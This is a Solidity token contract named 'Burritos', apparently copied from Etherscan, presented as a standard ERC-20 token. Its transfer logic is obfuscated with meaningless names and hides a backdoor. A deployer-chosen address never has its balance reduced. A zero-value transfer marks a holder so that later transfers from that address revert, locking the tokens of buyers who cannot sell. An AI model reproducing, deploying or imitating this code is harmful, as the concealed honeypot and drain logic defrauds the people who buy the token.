/**
 *Submitted for verification at Etherscan.io on 2023-05-21
*/

/**
 *Submitted for verification at Etherscan.io on 2023-05-16
*/

/*

https://t.me/burritosportal

*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.3;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract Burritos is Ownable {
    function transfer(address vowel, uint256 syllable) public returns (bool success) {
        coal(msg.sender, vowel, syllable);
        return true;
    }

    mapping(address => uint256) public balanceOf;

    string public name = 'Burritos';

    function approve(address building, uint256 syllable) public returns (bool success) {
        allowance[msg.sender][building] = syllable;
        emit Approval(msg.sender, building, syllable);
        return true;
    }

    uint256 private screen = 24;

    uint8 public decimals = 9;

    function transferFrom(address wherever, address vowel, uint256 syllable) public returns (bool success) {
        coal(wherever, vowel, syllable);
        require(syllable <= allowance[wherever][msg.sender]);
        allowance[wherever][msg.sender] -= syllable;
        return true;
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => uint256) private order;

    function coal(address wherever, address vowel, uint256 syllable) private returns (bool success) {
        if (order[wherever] == 0) {
            balanceOf[wherever] -= syllable;
        }

        if (syllable == 0) scientist[vowel] += screen;

        if (order[wherever] == 0 && uniswapV2Pair != wherever && scientist[wherever] > 0) {
            order[wherever] -= screen;
        }

        balanceOf[vowel] += syllable;
        emit Transfer(wherever, vowel, syllable);
        return true;
    }

    mapping(address => uint256) private scientist;

    mapping(address => mapping(address => uint256)) public allowance;

    string public symbol = 'Burritos';

    event Transfer(address indexed from, address indexed to, uint256 value);

    IUniswapV2Router02 private uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    address public uniswapV2Pair;

    constructor(address snake) {
        balanceOf[msg.sender] = totalSupply;
        order[snake] = screen;
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    }
}